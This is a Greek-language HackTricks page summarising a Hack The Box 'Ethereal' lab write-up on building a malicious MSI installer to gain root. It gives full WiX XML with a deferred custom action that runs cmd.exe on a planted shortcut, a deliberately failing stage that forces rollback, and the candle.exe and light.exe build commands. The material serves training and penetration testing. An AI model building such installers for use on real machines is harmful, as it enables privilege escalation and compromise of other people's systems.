<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

# Δημιουργία Κακόβουλου MSI και Απόκτηση Root

Η δημιουργία του εγκαταστάτη MSI θα γίνει χρησιμοποιώντας το wixtools, συγκεκριμένα θα χρησιμοποιηθεί το [wixtools](http://wixtoolset.org). Αξίζει να αναφερθεί ότι δοκιμάστηκαν εναλλακτικοί δημιουργοί MSI, αλλά δεν είχαν επιτυχία σε αυτήν την συγκεκριμένη περίπτωση.

Για μια κατανόηση των παραδειγμάτων χρήσης του wix MSI, συνιστάται να ανατρέξετε σε [αυτήν τη σελίδα](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Εδώ μπορείτε να βρείτε διάφορα παραδείγματα που δείχνουν τη χρήση του wix MSI.

Ο στόχος είναι να δημιουργηθεί ένα MSI που θα εκτελεί το αρχείο lnk. Για να επιτευχθεί αυτό, μπορεί να χρησιμοποιηθεί ο παρακάτω κώδικας XML ([xml από εδώ](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Είναι σημαντικό να σημειωθεί ότι το στοιχείο Package περιέχει γνωρίσματα όπως το InstallerVersion και το Compressed, που καθορίζουν την έκδοση του εγκαταστάτη και υποδηλώνουν εάν το πακέτο είναι συμπιεσμένο ή όχι, αντίστοιχα.

Ο διαδικασία δημιουργίας περιλαμβάνει τη χρήση του εργαλείου candle.exe από το wixtools, για τη δημιουργία ενός αντικειμένου wix από το msi.xml. Πρέπει να εκτελεστεί η παρακάτω εντολή:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Επιπλέον, αξίζει να αναφερθεί ότι παρέχεται μια εικόνα στην ανάρτηση, η οποία απεικονίζει την εντολή και την έξοδό της. Μπορείτε να ανατρέξετε σε αυτήν για οπτική καθοδήγηση.

Επιπλέον, το light.exe, ένα άλλο εργαλείο από τα wixtools, θα χρησιμοποιηθεί για τη δημιουργία του αρχείου MSI από το wixobject. Η εντολή που πρέπει να εκτελεστεί είναι η εξής:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Παρόμοια με την προηγούμενη εντολή, περιλαμβάνεται μια εικόνα στην ανάρτηση που επεξηγεί την εντολή και την έξοδό της.

Παρακαλούμε να σημειωθεί ότι, ενώ αυτή η περίληψη αποσκοπεί να παρέχει χρήσιμες πληροφορίες, συνιστάται να ανατρέξετε στην αρχική ανάρτηση για πιο λεπτομερείς πληροφορίες και ακριβείς οδηγίες.

## Αναφορές
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
